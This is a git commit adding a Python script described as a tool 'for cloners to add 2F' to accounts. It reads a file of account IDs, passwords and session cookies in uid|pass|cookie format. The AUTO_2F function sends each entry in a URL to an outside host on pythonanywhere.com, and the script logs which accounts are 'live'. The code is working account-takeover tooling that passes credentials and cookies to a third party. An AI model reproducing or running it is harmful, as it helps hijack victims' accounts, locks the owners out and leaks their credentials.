db5fc9b6b4da3e4ec43dff6aa35b4a80ad39395f
Ahmed Ali <110410370+Ahmed-XD@users.noreply.github.com>
2023-08-06 17:34:34 +0600

    Create 2F_AUTOMATION.py

---
+++ 2F_AUTOMATION.py
@@ -0,0 +1,80 @@
+"""
+echo "Written by Ahmed Ali"
+
+"""
+
+import os
+import requests
+
+class TwoFactorCloner:
+    GREEN = '\x1b[1;92m'
+    RED = '\x1b[1;91m'
+    YELLOW = '\x1b[1;93m'
+    WHITE = '\x1b[1;97m'
+    
+    def __init__(self):
+        self.ok = 0
+        self.fail = 0
+
+    def AUTO_2F(self, uid, password, cookie):
+        send_req = requests.get(f"https://livedeadsegs.pythonanywhere.com/TWO_FACTOR?uid={uid}&password={password}&cookie={cookie}").text
+        return send_req
+
+    def divider(self):
+        print(f"{self.WHITE}-" * 54)
+
+    def run(self):
+        os.system("clear")
+        self.divider()
+        print(f"{self.GREEN}This tool is created by Ahmed Ali")
+        print(f"{self.YELLOW}This tool is made for cloners to add 2F in their account. In file idz must be in uid|pass|cookie format")
+        print(f"{self.GREEN}Live idz will be saved in 2f_live.txt and 2f_live_with_cookies.txt")
+        print(f"{self.RED}Dead idz will be saved in 2f_failed.txt")
+        self.divider()
+        
+        get_file = input("Enter file path: ")
+        try:
+            get_file_info = open(get_file, 'r').read().splitlines()
+        except FileNotFoundError:
+            exit("File not found")
+
+        for element in get_file_info:
+            if element == "":
+                break
+            try:
+                uid, password, cookie = element.split("|")
+            except ValueError:
+                self.divider()
+                print(f"{self.YELLOW}[WRONG FORMAT] " + element)
+                self.divider()
+                with open("wrong_format.txt", 'a') as f:
+                    f.write(element + '\n')
+                continue
+
+            data = self.AUTO_2F(uid=uid, password=password, cookie=cookie)
+            if '[2F]' in data:
+                datax = data.replace("[2F] ", "")
+                print(f"{self.GREEN}[2F] {datax}")
+                self.ok += 1
+                with open("2f_live.txt", 'a') as f:
+                    f.write(element + '\n')
+                with open("2f_live_with_cookies.txt", "a") as f:
+                    f.write(f"{datax}|{cookie}\n")
+            elif 'Cookies lol' in data:
+                print(f"{self.RED}[FL] {data}")
+                self.fail += 1
+                with open("2f_failed.txt", 'a') as f:
+                    f.write(element + '\n')
+            elif 'wrong password' in data:
+                print(f"{self.WHITE}[WR] {data}")
+                self.fail += 1
+                with open("wrong_pass.txt", 'a') as f:
+                    f.write(element + '\n')
+            else:
+                exit("Error" + data)
+
+        print(f"\033[1;37mTotal Checked {len(get_file_info)} uid\n2F added: \033[1;32m{str(self.ok)}\n\033[1;37m2F Failed: \033[1;31m{str(self.fail)}")
+
+if __name__ == "__main__":
+    cloner = TwoFactorCloner()
+    cloner.run()
